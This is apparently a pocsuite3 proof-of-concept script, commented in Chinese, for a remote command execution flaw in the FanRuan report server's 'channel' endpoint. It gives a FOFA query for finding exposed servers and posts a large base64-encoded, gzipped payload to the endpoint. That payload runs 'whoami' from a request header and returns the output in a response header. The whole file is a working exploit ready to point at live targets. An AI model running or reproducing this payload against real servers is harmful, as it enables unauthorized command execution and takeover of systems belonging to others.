#!/usr/bin/env python
# coding: utf-8
from collections import OrderedDict
from urllib.parse import urljoin
import re,random,hashlib,base64,json
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2023-08-13'  #漏洞公开的时间,不知道就写今天
    createDate = '2023-08-13'  # 编写 PoC 的日期
    updateDate = '2023-08-13'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = ''  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = ''  # 漏洞应用名称
    appVersion = ''''''  # 漏洞影响版本
    vulType = VUL_TYPE.CODE_EXECUTION #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        fofa:"Powered by 帆软"
        帆软报表 channel 接口存在远程命令执行漏洞, 攻击者通过漏洞可以获取服务器权限，攻击服务器
    '''
  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    def cmd(self):
        try:
            burp0_url = self.url + "/webroot/decision/remote/design/channel"
            burp0_headers = {"Content-Type": "application/x-www-form-urlencoded", "Testdmc": "whoami", "Testecho": "TestEcho"}
            b = b"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"
            burp0_data = base64.b64decode(b)
            resq_cmd = requests.post(burp0_url, headers=burp0_headers,data=burp0_data,verify=False, timeout=3)
            return resq_cmd
        except Exception as e:
            return
    
    def _verify(self):
        result = {}
        path ="/webroot/decision/remote/design/channel"  
        headers={
            "Pragma": "no-cache",
            "Cache-Control": "no-cache",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Connection": "close",
        }
        try:
            resq  = requests.get(url=self.url+path,headers=headers,timeout=5)
            if "method 'GET' not supported" in resq.text:
                resq_2 = requests.post(url=self.url+path, headers=headers,verify=False, timeout=5)
                if "如需访问请联系管理员" not in resq_2.text:
                    resq_cmd = self.cmd()
                    if resq_cmd.status_code == 200 and 'Testdmc' in resq_cmd.headers and resq_cmd.headers['Testdmc']:
                        # 返回内容
                        testdmc_value = resq_cmd.headers['Testdmc']
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['URL'] = self.url + path
                        result['VerifyInfo']['Testdmc的值为'] = base64.b64decode(testdmc_value).decode('utf-8')
        except Exception as e:
            return
        return self.parse_output(result)         

    def _attack(self):
        return self._verify()
    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)